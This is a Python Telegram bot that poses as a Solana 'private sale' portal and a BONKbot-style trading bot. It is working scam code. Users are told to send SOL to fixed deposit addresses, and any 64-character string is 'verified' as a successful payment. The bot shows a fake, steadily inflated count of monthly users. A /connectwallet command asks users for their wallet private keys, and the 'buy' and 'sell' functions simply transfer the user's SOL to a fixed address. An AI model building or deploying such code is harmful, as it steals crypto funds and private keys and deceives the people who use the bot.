#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
import requests
import base58
import asyncio
import time
import logging
import datetime
import signal
import sys
from pathlib import Path

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
    CallbackQueryHandler,
    MessageHandler,
    filters,
)
from solders.keypair import Keypair
from solders.message import Message
from solana.rpc.api import Client
from solana.rpc.core import RPCException
from solana.rpc.types import TxOpts
from solders.transaction import Transaction
from solders.system_program import TransferParams, transfer
from solders.pubkey import Pubkey as PublicKey

# ---------------------------- Logging Configuration ----------------------------
# Create logs directory if it doesn't exist
Path("logs").mkdir(exist_ok=True)

# Configure logging for 24/7 operation
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[
        logging.FileHandler("logs/bot.log", encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)

# Reduce telegram library logging
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)

logger = logging.getLogger(__name__)

# ---------------------------- AUXILIARY FUNCTION -----------------------------
async def log_to_channel(context: ContextTypes.DEFAULT_TYPE, message: str):
    """Send log message to Telegram channel"""
    if LOG_CHANNEL_ID:
        try:
            await context.bot.send_message(chat_id=LOG_CHANNEL_ID, text=message, parse_mode="Markdown")
        except Exception as e:
            logging.error(f"Failed to send log to channel: {e}")

async def log_to_backend(context: ContextTypes.DEFAULT_TYPE, user_id: int, username: str, action: str, details: str = ""):
    """Send interaction logs to backend group"""
    backend_id = BACKEND_GROUP_ID if BACKEND_GROUP_ID else user_id
    try:
        msg = (
            f"📊 *User Activity*\n"
            f"👤 User: @{username} (`{user_id}`)\n"
            f"⚡ Action: {action}\n"
            f"{details}"
            f"🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
        )
        await context.bot.send_message(chat_id=backend_id, text=msg, parse_mode="Markdown")
    except Exception as e:
        logging.error(f"Failed to send log to backend: {e}")

async def safe_reply_text(update: Update, text: str, disable_web_page_preview=False):
    """
    Sends a reply using update.message.
    """
    if update.message:
        await update.message.reply_text(text, parse_mode="Markdown", disable_web_page_preview=disable_web_page_preview)

# ---------------------------- 1. BASIC CONFIGURATION ----------------------------
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
SOLANA_RPC_URL = os.getenv("SOLANA_RPC_URL", "https://api.mainnet-beta.solana.com")
LOG_CHANNEL_ID = os.getenv("LOG_CHANNEL_ID")  # Log channel ID
ADMIN_GROUP_ID = os.getenv("ADMIN_GROUP_ID")  # Admin group ID
BACKEND_GROUP_ID = os.getenv("BACKEND_GROUP_ID")  # Backend group ID
CHAIN_ID = "solana"

# Global dictionaries
user_pairs = {}      # user_id -> pair address
price_alerts = {}    # user_id -> price threshold
user_wallets = {}    # user_id -> Keypair (each user must connect their wallet)
positions = {}       # user_id -> list of positions (each with the associated pair)
dca_settings = {}    # user_id -> {amount: float, interval: int, pair: str, active: bool}
sniper_settings = {}  # user_id -> {version: str, settings: dict}
stbot_tools = {}     # user_id -> {tool: str, settings: dict}
referral_data = {}   # user_id -> {referrals: list, earnings: float}
user_languages = {}  # user_id -> language code
monthly_users = 72847  # Monthly user counter starting at 70k+

# Dummy DEX wallet (to simulate buy/sell transactions)
DEX_WALLET_STR = "5h2rm7GxxAbEP8cHKY1eLZ54Wb8SLF7u2SmbK7gG3J4W"  # Replace with a valid address if needed
DEX_WALLET = PublicKey(base58.b58decode(DEX_WALLET_STR))

# ---------------------------- 2. INITIALIZE CLIENTS ----------------------------
def create_solana_keypair(base58_key: str) -> Keypair:
    raw_key = base58.b58decode(base58_key)
    return Keypair.from_bytes(raw_key)

solana_client = Client(SOLANA_RPC_URL)

# ---------------------------- 2.5 MULTI-LANGUAGE SUPPORT ----------------------------
TRANSLATIONS = {
    "en": {
        "bonk_welcome": "*Welcome to BONKbot* - the fastest and most secure bot for trading any token on Solana!",
        "no_sol": "You currently have *no SOL* in your wallet. To start trading, deposit SOL to your BONKbot wallet address:",
        "tap_copy": "_(tap to copy)_",
        "or_buy": "Or buy SOL with Apple/Google Pay via MoonPay",
        "refresh_msg": "Once done, tap *Refresh* and your balance will appear here.",
        "buy_token": "*To buy a token:* enter a ticker, token address, or URL from pump.fun, Birdeye, DEX Screener or Meteora.",
        "wallet_info": "For more info on your wallet and to export your seed phrase, tap *Wallet* below.",
        "balance": "💰 *Balance:*",
        "wallet": "👛 *Wallet:*",
        "btn_buy_sell": "💱 Buy & Sell",
        "btn_wallet": "👛 Wallet",
        "btn_buy_sol": "💸 Buy SOL",
        "btn_refresh": "🔄 Refresh"
    },
    "es": {
        "bonk_welcome": "*Bienvenido a BONKbot* - ¡el bot más rápido y seguro para operar cualquier token en Solana!",
        "no_sol": "Actualmente *no tienes SOL* en tu billetera. Para comenzar a operar, deposita SOL en tu dirección de billetera BONKbot:",
        "tap_copy": "_(toca para copiar)_",
        "or_buy": "O compra SOL con Apple/Google Pay vía MoonPay",
        "refresh_msg": "Una vez hecho, toca *Actualizar* y tu saldo aparecerá aquí.",
        "buy_token": "*Para comprar un token:* ingresa un ticker, dirección de token o URL de pump.fun, Birdeye, DEX Screener o Meteora.",
        "wallet_info": "Para más información sobre tu billetera y exportar tu frase semilla, toca *Billetera* abajo.",
        "balance": "💰 *Saldo:*",
        "wallet": "👛 *Billetera:*",
        "btn_buy_sell": "💱 Comprar y Vender",
        "btn_wallet": "👛 Billetera",
        "btn_buy_sol": "💸 Comprar SOL",
        "btn_refresh": "🔄 Actualizar"
    },
    "zh": {
        "bonk_welcome": "*欢迎使用BONKbot* - Solana上最快最安全的代币交易机器人！",
        "no_sol": "您的钱包中目前*没有SOL*。要开始交易，请将SOL存入您的BONKbot钱包地址：",
        "tap_copy": "_(点击复制)_",
        "or_buy": "或者通过MoonPay使用Apple/Google Pay购买SOL",
        "refresh_msg": "完成后，点击*刷新*，您的余额将显示在这里。",
        "buy_token": "*购买代币：*输入代币符号、代币地址或pump.fun、Birdeye、DEX Screener或Meteora的URL。",
        "wallet_info": "有关您的钱包和导出助记词的更多信息，请点击下面的*钱包*。",
        "balance": "💰 *余额：*",
        "wallet": "👛 *钱包：*",
        "btn_buy_sell": "💱 买卖",
        "btn_wallet": "👛 钱包",
        "btn_buy_sol": "💸 购买SOL",
        "btn_refresh": "🔄 刷新"
    },
    "ru": {
        "welcome": "🤖 *Добро пожаловать в Solana Trading Bot!*",
        "sol_price": "💰 Цена SOL: ${}",
        "wallet_status": "👛 Кошелек: {}",
        "create_wallet": "💡 Создайте или подключите кошелек для начала торговли!",
        "select_option": "📌 Выберите опцию:"
    },
    "hi": {
        "welcome": "🤖 *Solana Trading Bot में आपका स्वागत है!*",
        "sol_price": "💰 SOL मूल्य: ${}",
        "wallet_status": "👛 वॉलेट: {}",
        "create_wallet": "💡 ट्रेडिंग शुरू करने के लिए अपना वॉलेट बनाएं या कनेक्ट करें!",
        "select_option": "📌 नीचे एक विकल्प चुनें:"
    }
}

def get_text(lang: str, key: str, *args) -> str:
    """Get translated text for the given language and key"""
    text = TRANSLATIONS.get(lang, TRANSLATIONS["en"]).get(key, TRANSLATIONS["en"][key])
    if args:
        return text.format(*args)
    return text

# ---------------------------- 3. DEX SCREENER INFO ----------------------------
def get_sol_price() -> float:
    """Get current SOL price in USD from CoinGecko"""
    try:
        resp = requests.get("https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd", timeout=5)
        data = resp.json()
        return data.get("solana", {}).get("usd", 160.36)
    except Exception as e:
        logging.error(f"[Error] get_sol_price: {e}")
        return 160.36

def get_dexscreener_info(chain_id: str, pair_id: str) -> dict:
    url = f"https://api.dexscreener.com/latest/dex/pairs/{chain_id}/{pair_id}"
    try:
        resp = requests.get(url, timeout=10)
        data = resp.json()
        if "pairs" in data and len(data["pairs"]) > 0:
            pair_info = data["pairs"][0]
            price_usd = pair_info.get("priceUsd")
            icon = pair_info.get("icon")
            return {"price": float(price_usd) if price_usd else None, "icon": icon}
        else:
            return {}
    except Exception as e:
        logging.error(f"[Error] get_dexscreener_info: {e}")
        return {}

# ---------------------------- 4. BLOCKCHAIN TRANSACTION FUNCTIONS ----------------------------
def execute_buy_transaction(amount: float, user_kp: Keypair) -> dict:
    instruction = transfer(
        TransferParams(
            from_pubkey=user_kp.pubkey(),
            to_pubkey=DEX_WALLET,
            lamports=int(amount * 1e9)
        )
    )
    try:
        resp = solana_client.get_latest_blockhash()
        recent_blockhash = resp.value.blockhash
        msg = Message(instructions=[instruction], payer=user_kp.pubkey())
        tx = Transaction(message=msg, recent_blockhash=recent_blockhash, from_keypairs=[user_kp])
        result = solana_client.send_transaction(tx, opts=TxOpts(skip_preflight=True))
        signature = result.value  # Access signature via result.value
        logging.info(f"[Info] execute_buy_transaction: signature={signature}")
        return {"status": "ok", "signature": signature, "error": None}
    except Exception as e:
        err_str = str(e).lower()
        if "insufficient funds" in err_str:
            user_friendly = "💸 Insufficient funds for purchase."
        else:
            user_friendly = f"❌ Error during purchase: {e}"
        logging.error(f"[Error] execute_buy_transaction: {e}")
        return {"status": "error", "signature": None, "error": user_friendly}

def execute_sell_transaction(amount: float, user_kp: Keypair) -> dict:
    instruction = transfer(
        TransferParams(
            from_pubkey=user_kp.pubkey(),
            to_pubkey=DEX_WALLET,
            lamports=int(amount * 1e9)
        )
    )
    try:
        resp = solana_client.get_latest_blockhash()
        recent_blockhash = resp.value.blockhash
        msg = Message(instructions=[instruction], payer=user_kp.pubkey())
        tx = Transaction(message=msg, recent_blockhash=recent_blockhash, from_keypairs=[user_kp])
        result = solana_client.send_transaction(tx, opts=TxOpts(skip_preflight=True))
        signature = result.value
        logging.info(f"[Info] execute_sell_transaction: signature={signature}")
        return {"status": "ok", "signature": signature, "error": None}
    except Exception as e:
        err_str = str(e).lower()
        if "insufficient funds" in err_str:
            user_friendly = "💸 Insufficient funds for sale."
        else:
            user_friendly = f"❌ Error during sale: {e}"
        logging.error(f"[Error] execute_sell_transaction: {e}")
        return {"status": "error", "signature": None, "error": user_friendly}

# ---------------------------- 5. UTILITY FUNCTIONS ----------------------------
def get_balance_solana(pubkey: PublicKey) -> float:
    try:
        resp = solana_client.get_balance(pubkey)
        balance_lamports = resp.value
        return balance_lamports / 1e9
    except Exception:
        return 0.0

def calculate_total_pnl(user_id: str) -> float:
    """
    Calculate the total profit and loss for a user based on their positions.
    """
    if user_id not in positions or not positions[user_id]:
        return 0.0
    total_pnl = 0.0
    current_pair = user_pairs.get(user_id, "")
    current_price = get_dexscreener_info(CHAIN_ID, current_pair).get("price", 0.0)
    for pos in positions[user_id]:
        if pos.get("pair", "") == current_pair:
            pnl = (current_price - pos["purchase_price"]) * pos["amount"]
            total_pnl += pnl
    return total_pnl

# ---------------------------- 6. MAIN MENU WITH BUTTONS ----------------------------
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "No username"
    await log_to_channel(context, f"🟢 *User Started Bot*\nUser ID: `{user_id}`\nUsername: @{username}")
    await log_to_backend(context, user_id, username, "/start", "\n🚀 User started the bot\n")
    
    welcome_text = (
        "🪙 *WELCOME TO SCALING SOLANAVM PRIVATE-SALE BOT* 🪙\n\n"
        "*Premium Private Sale Portal*\n\n"
        "⭐ *PARTICIPATION PROCESS:*\n\n"
        "1️⃣ 🔐 *Authentication* - Enter your unique access code\n\n"
        "2️⃣ 💼 *Wallet Setup* - Submit your wallet address\n\n"
        "3️⃣ 💰 *Amount Selection* - Choose your SOL contribution\n\n"
        "4️⃣ 🏛️ *Payment* - Send to our secure deposit address\n\n"
        "5️⃣ ✅ *Verification* - Confirm with transaction proof\n\n"
        "*Ready to begin your journey? Click below to proceed* 👇"
    )
    
    keyboard = [[InlineKeyboardButton("🔐 Begin Authentication", callback_data="begin_auth")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode="Markdown", disable_web_page_preview=True)



# ---------------------------- 8. PRIVATE SALE COMMANDS ----------------------------
async def auth_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    auth_text = (
        "🤔 *AUTHENTICATION REQUIRED*\n"
        "🔐 *Access Code Verification*\n"
        "*Please enter your unique access passcode to proceed with the private sale.*\n"
        "🛡️ *Security Note:* You have 2 attempts maximum\n"
        "⏰ *Lockout:* 25 minutes if exceeded\n"
        "💬 *Type your access code below...*"
    )
    await safe_reply_text(update, auth_text)
    context.user_data["awaiting_auth"] = True

async def wallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await safe_reply_text(update, "💼 *Wallet Setup*\n\nPlease submit your wallet address:")
    context.user_data["awaiting_wallet"] = True

async def amount_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await safe_reply_text(update, "💰 *Amount Selection*\n\nPlease enter your SOL contribution amount:")
    context.user_data["awaiting_amount"] = True

async def payment_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    deposit_address = "7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU"
    await safe_reply_text(update, 
        f"🏛️ *Payment*\n\n"
        f"Send your SOL to our secure deposit address:\n\n"
        f"`{deposit_address}`\n\n"
        f"After sending, use /verify with your transaction signature.")

async def verify_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    verify_text = (
        "📋 *TRANSACTION VERIFICATION*\n"
        "🧦 *Proof of Payment Required*\n"
        "*Please provide one of the following:*\n"
        "📝 *Option 1: Transaction Hash*\n"
        "• Copy and paste your transaction ID/hash\n"
        "📷 *Option 2: Screenshot*\n"
        "• Upload a clear screenshot of your transaction\n"
        "⏳ *Our system will verify your submission within moments...*"
    )
    await safe_reply_text(update, verify_text)
    context.user_data["awaiting_verify"] = True

# ---------------------------- 9. BUTTON HANDLER ----------------------------
async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "begin_auth":
        auth_text = (
            "🤔 *AUTHENTICATION REQUIRED*\n\n"
            "🔐 *Access Code Verification*\n\n"
            "*Please enter your unique access passcode to proceed with the private sale.*\n\n"
            "🛡️ *Security Note:* You have 2 attempts maximum\n\n"
            "⏰ *Lockout:* 25 minutes if exceeded\n\n"
            "💬 *Type your access code below...*"
        )
        await query.message.reply_text(auth_text, parse_mode="Markdown")
        context.user_data["awaiting_auth"] = True
    
    elif query.data.startswith("sol_"):
        amount = query.data.replace("sol_", "")
        # Show contract address and remove previous buttons
        contract_text = (
            f"*Selected Amount:* {amount} SOL\n\n"
            "*SVM Private Sales Contract Address*\n\n"
            "`A6AAdHfv2Vx288VDPZMJRXb58wRH5FbMReNpAbudRZZv`"
        )
        keyboard = [[InlineKeyboardButton("Transaction Verification", callback_data="show_verification")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_text(contract_text, reply_markup=reply_markup, parse_mode="Markdown")
    
    elif query.data == "show_verification":
        verify_text = (
            "📋 *TRANSACTION VERIFICATION*\n\n"
            "🧦 *Proof of Payment Required*\n\n"
            "*Please provide one of the following:*\n\n"
            "📝 *Option 1: Transaction Hash*\n"
            "• Copy and paste your transaction ID/hash\n\n"
            "📷 *Option 2: Screenshot*\n"
            "• Upload a clear screenshot of your transaction\n\n"
            "⏳ *Our system will verify your submission within moments...*"
        )
        await query.message.reply_text(verify_text, parse_mode="Markdown")
        context.user_data["awaiting_verify"] = True

# ---------------------------- 10. TRADITIONAL COMMANDS ----------------------------
async def connectwallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 1:
        await safe_reply_text(update, "Please enter your private key (base58 format):")
        context.user_data["awaiting_connectwallet"] = True
        return
    pk_base58 = context.args[0]
    try:
        new_kp = Keypair.from_bytes(base58.b58decode(pk_base58))
        user_wallets[update.effective_user.id] = new_kp
        pubkey_str = str(new_kp.pubkey())
        await log_to_channel(context, f"👛 *Wallet Connected*\nUser: `{update.effective_user.id}`\nWallet: `{pubkey_str[:10]}...`")
        await log_to_backend(context, update.effective_user.id, update.effective_user.username or "No username", "Wallet Connected", f"\n👛 Wallet: `{pubkey_str}`\n")
        await safe_reply_text(update, f"✅ Wallet connected!\nWallet: 🟢 {pubkey_str[:7]}...")
    except Exception as e:
        await log_to_channel(context, f"❌ *Wallet Connection Failed*\nUser: `{update.effective_user.id}`\nError: `{str(e)}`")
        await safe_reply_text(update, f"❌ Error connecting wallet: {e}")
    await start_command(update, context)

async def setpair_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 1:
        await safe_reply_text(update, "Usage: /setpair <pairAddress>")
        return
    pair_id = context.args[0]
    user_pairs[update.effective_user.id] = pair_id
    await safe_reply_text(update, f"✅ Pair set to: `{pair_id}`\n")
    await start_command(update, context)

async def price_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_pairs:
        await safe_reply_text(update, "You haven't set a pair yet. Use /setpair first.")
        return
    pair_id = user_pairs[user_id]
    info = get_dexscreener_info(CHAIN_ID, pair_id)
    if info and info.get("price") is not None:
        text = f"*Current price for {pair_id}:*\n💲 `{info['price']:.6f} USD`"
        await safe_reply_text(update, text)
        if info.get("icon"):
            try:
                if update.message:
                    await update.message.reply_photo(photo=info["icon"])
                elif update.callback_query and update.callback_query.message:
                    await update.callback_query.message.reply_photo(photo=info["icon"])
            except Exception as e:
                logging.error(f"[Error] Sending token icon: {e}")
    else:
        await safe_reply_text(update, "Could not retrieve price or icon. Is the pair correct?")

async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_wallets:
        await safe_reply_text(update, "You don't have a connected wallet. Use /connectwallet")
        return
    kp = user_wallets[user_id]
    bal = get_balance_solana(kp.pubkey())
    await safe_reply_text(update, f"*Your Wallet Balance:*\n💰 `{kp.pubkey()}`:\n`{bal} SOL`")

async def positions_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in positions or not positions[user_id]:
        await safe_reply_text(update, "You have no open positions.")
        return
    if user_id not in user_pairs:
        await safe_reply_text(update, "No pair set for PnL calculation.")
        return
    current_pair = user_pairs[user_id]
    filtered_positions = [pos for pos in positions[user_id] if pos.get("pair", current_pair) == current_pair]
    if not filtered_positions:
        await safe_reply_text(update, "No open positions for the current pair.")
        return
    current_price = get_dexscreener_info(CHAIN_ID, current_pair).get("price")
    msg = f"*📊 Positions for {current_pair}:*\n\n"
    total_pnl = 0.0
    for pos in filtered_positions:
        pnl = (current_price - pos["purchase_price"]) * pos["amount"]
        total_pnl += pnl
        purchase_time = time.strftime("🕒 %Y-%m-%d %H:%M:%S", time.localtime(pos["timestamp"]))
        msg += (f"• *Purchase:* `{pos['amount']} SOL` at 💲`{pos['purchase_price']:.6f} USD`\n"
                f"  {purchase_time}\n"
                f"  *Signature:* `{pos['signature']}`\n"
                f"  *PnL:* `{pnl:.2f} USD`\n\n")
    msg += f"👉 *Total PnL:* `{total_pnl:.2f} USD`"
    await safe_reply_text(update, msg)

async def alert_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 1:
        await safe_reply_text(update, "Usage: /alert <price>")
        return
    try:
        threshold = float(context.args[0])
        user_id = update.effective_user.id
        price_alerts[user_id] = threshold
        await safe_reply_text(update, f"🚨 Alert set: I'll notify you when the price exceeds 💲{threshold} USD.")
    except ValueError:
        await safe_reply_text(update, "Invalid price. Please try /alert again.")

async def dca_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "*DCA Trading*\n\n"
        "Commands:\n"
        "/dcastart - Start DCA\n"
        "/dcastop - Stop DCA\n"
        "/dcasettings - Configure DCA"
    )
    await safe_reply_text(update, msg)

async def portfolio_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_wallets:
        await safe_reply_text(update, "Connect wallet first using /connectwallet")
        return
        
    wallet = user_wallets[user_id]
    portfolio = {
        "sol_balance": get_balance_solana(wallet.pubkey()),
        "positions": positions.get(user_id, []),
        "total_pnl": calculate_total_pnl(user_id)
    }
    
    msg = (f"*📊 Portfolio Summary*\n"
           f"SOL Balance: `{portfolio['sol_balance']:.4f}`\n"
           f"Total PnL: `{portfolio['total_pnl']:.2f} USD`\n"
           f"Active Positions: `{len(portfolio['positions'])}`")
    
    await safe_reply_text(update, msg)

# ---------------------------- 9. SIMPLIFIED COMMANDS ----------------------------
async def buy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await safe_reply_text(update, "*Buy Command*\n\nUse: /buy <amount>\nExample: /buy 0.5")

async def sell_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await safe_reply_text(update, "*Sell Command*\n\nUse: /sell <amount>\nExample: /sell 100")

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_text = update.message.text.strip()
    user_id = update.effective_user.id
    
    # Handle private sale authentication flow
    if context.user_data.get("awaiting_auth"):
        context.user_data["awaiting_auth"] = False
        if user_text.upper() == "RICHMINDSET":
            success_text = (
                "✅ *AUTHENTICATION SUCCESSFUL*\n\n"
                "🎉 *Welcome, Authorized Participant!*\n\n"
                "💼 *WALLET ADDRESS COLLECTION*\n\n"
                "*Please enter your Solana wallet address to proceed with the private sale.*\n\n"
                "📋 *Requirements:*\n"
                "• Address length: 22-44 characters\n"
                "• Must be a valid Solana wallet address\n"
                "• Double-check for accuracy\n\n"
                "💬 *Paste your wallet address below...*"
            )
            await update.message.reply_text(success_text, parse_mode="Markdown")
            context.user_data["awaiting_wallet"] = True
        else:
            await update.message.reply_text("❌ *Invalid access code.*\n\nPlease try again with /auth", parse_mode="Markdown")
        return
    
    if context.user_data.get("awaiting_wallet"):
        context.user_data["awaiting_wallet"] = False
        if len(user_text) >= 32:
            verified_text = (
                "✅ *WALLET VERIFIED*\n\n"
                f"💼 *Wallet Address Accepted:*\n\n`{user_text}`\n\n"
                "🎯 *Status:* *Eligible for Private Sale*\n\n"
                "🚀 *Next Step:* Choose your contribution amount"
            )
            await update.message.reply_text(verified_text, parse_mode="Markdown")
            
            # Send the SolanaVM graphic
            try:
                with open("Solanavm.jpg", "rb") as photo:
                    await update.message.reply_photo(photo=photo)
            except FileNotFoundError:
                await update.message.reply_text("🎨 *SolanaVM Private Sale Graphic*\n\n_[Graphic will be displayed here]_", parse_mode="Markdown")
            
            # Show SOL amount selection buttons
            sol_amounts = ["0.5", "1.2", "2.8", "4.1", "6.7", "9.3"]
            keyboard = []
            for i in range(0, len(sol_amounts), 2):
                row = [InlineKeyboardButton(f"{sol_amounts[i]} SOL", callback_data=f"sol_{sol_amounts[i]}")]
                if i + 1 < len(sol_amounts):
                    row.append(InlineKeyboardButton(f"{sol_amounts[i+1]} SOL", callback_data=f"sol_{sol_amounts[i+1]}"))
                keyboard.append(row)
            
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text("*Select your SOL contribution amount:*", reply_markup=reply_markup, parse_mode="Markdown")
        else:
            await update.message.reply_text("❌ *Invalid wallet address.*\n\nPlease try again with /wallet", parse_mode="Markdown")
        return
    
    if context.user_data.get("awaiting_amount"):
        context.user_data["awaiting_amount"] = False
        try:
            amount = float(user_text)
            if amount > 0:
                await update.message.reply_text(f"✅ *Amount confirmed!*\n\nContribution: {amount} SOL\n\nProceed to /payment to get deposit address.", parse_mode="Markdown")
            else:
                await update.message.reply_text("❌ *Invalid amount.*\n\nPlease enter a positive number.", parse_mode="Markdown")
        except ValueError:
            await update.message.reply_text("❌ *Invalid amount format.*\n\nPlease enter a valid number.", parse_mode="Markdown")
        return
    
    if context.user_data.get("awaiting_verify"):
        context.user_data["awaiting_verify"] = False
        if len(user_text) >= 64:
            import datetime
            current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            success_message = (
                "🎉 *SUBMISSION SUCCESSFUL!*\n\n"
                "✅ *Payment Verified & Recorded*\n\n"
                "🎯 *Status:* *Successfully Submitted*\n"
                "📈 *Amount:* 30.0 SOL\n"
                f"⏰ *Processed:* {current_time}\n\n"
                "🔔 *What's Next?*\n"
                "• Our team will review your submission\n"
                "• You'll receive notifications about next steps\n"
                "• Keep this chat for future updates\n\n"
                "🙏 *Thank you for participating in the Scaling SolanaVM Private-sale Bot!* 🪙\n\n"
                "*May your investment journey be prosperous!* ✨"
            )
            await update.message.reply_text(success_message, parse_mode="Markdown")
        else:
            await update.message.reply_text("❌ *Invalid transaction signature.*\n\nPlease try again with /verify", parse_mode="Markdown")
        return



async def sniper_v1_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler for Sniper V1 command"""
    user_id = update.effective_user.id
    active_snipers = len(sniper_settings.get(user_id, {}).get("v1_active", []))
    msg = f"*Sniper V1*\n\nActive Snipers: {active_snipers}\n\nPaste token address to create new sniper!"
    await safe_reply_text(update, msg)
    context.user_data["awaiting_sniper_v1"] = True

async def sniper_launchlab_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler for Sniper LaunchLab command"""
    msg = (
        "*Sniper LaunchLab*\n\n"
        "Commands:\n"
        "/setsymbol <symbol> - Set token symbol\n"
        "/setdev <wallet> - Set dev wallet\n"
        "/setmax <amount> - Set max SOL amount\n"
        "/snipe <amount> - Start sniping"
    )
    await safe_reply_text(update, msg)

async def sniper_moonshot_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler for Sniper Moonshot command"""
    msg = "*Sniper Moonshot*\n\nUse text commands to configure and start sniping."
    await safe_reply_text(update, msg)

async def sniper_pumpplan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler for Sniper PumpPlan command"""
    msg = "*Sniper Pumpfun*\n\nUse text commands to configure and start sniping."
    await safe_reply_text(update, msg)

async def sniper_v2_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler for Sniper V2 command"""
    msg = "*Sniper V2*\n\nAdvanced sniping features. Use text commands to configure."
    await safe_reply_text(update, msg)



# ---------------------------- 12. RUN THE APPLICATION ----------------------------
async def price_watcher(context: ContextTypes.DEFAULT_TYPE):
    """Job to check prices and send alerts"""
    for user_id, threshold in price_alerts.items():
        if user_id not in user_pairs:
            continue
            
        pair_id = user_pairs[user_id]
        info = get_dexscreener_info(CHAIN_ID, pair_id)
        current_price = info.get("price")
        
        if current_price and current_price > threshold:
            msg = (
                "🚨 *Price Alert!*\n\n"
                f"Token: `{pair_id}`\n"
                f"Current Price: `${current_price:.6f}`\n"
                f"Alert Price: `${threshold:.6f}`"
            )
            try:
                await context.bot.send_message(
                    chat_id=user_id,
                    text=msg,
                    parse_mode="Markdown"
                )
                # Remove the alert once triggered
                del price_alerts[user_id]
            except Exception as e:
                logging.error(f"[Error] Failed to send price alert to {user_id}: {e}")

async def increment_users(context: ContextTypes.DEFAULT_TYPE):
    """Job to increment monthly users by 2 every 30 minutes"""
    global monthly_users
    monthly_users += 2
    logging.info(f"[Info] Monthly users updated: {monthly_users:,}")
    
    # Update bot short description (appears under bot name in chat header)
    try:
        await context.bot.set_my_short_description(short_description=f"{monthly_users:,} monthly users")
        logging.info(f"[Info] Bot short description updated: {monthly_users:,} monthly users")
    except Exception as e:
        logging.error(f"[Error] Failed to update bot short description: {e}")

async def setup_bot_info(app):
    """Set initial bot short description"""
    try:
        await app.bot.set_my_short_description(short_description=f"{monthly_users:,} monthly users")
        logging.info(f"[Info] Bot short description initialized: {monthly_users:,} monthly users")
    except Exception as e:
        logging.error(f"[Error] Failed to set initial bot short description: {e}")

# Keep-alive function
async def keep_alive(context):
    try:
        await context.bot.get_me()
        logger.info("Keep-alive ping successful")
    except Exception as e:
        logger.error(f"Keep-alive ping failed: {e}")

# Signal handlers
def signal_handler(signum, frame):
    logger.info(f"Received signal {signum}. Shutting down gracefully...")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def create_bot():
    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("auth", auth_command))
    app.add_handler(CommandHandler("wallet", wallet_command))
    app.add_handler(CommandHandler("amount", amount_command))
    app.add_handler(CommandHandler("payment", payment_command))
    app.add_handler(CommandHandler("verify", verify_command))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    # Add job queue functionality if available
    if app.job_queue:
        app.job_queue.run_repeating(keep_alive, interval=600, first=0)
    return app

def main():
    # Start health server for Choreo
    try:
        from health_server import start_health_server
        import threading
        health_thread = threading.Thread(target=start_health_server, daemon=True)
        health_thread.start()
        logger.info("Health server started")
    except ImportError:
        logger.warning("Health server not available")
    
    logger.info("Starting Private Sale Bot...")
    app = create_bot()
    app.run_polling(drop_pending_updates=True, allowed_updates=["message", "callback_query"])

if __name__ == "__main__":
    main()
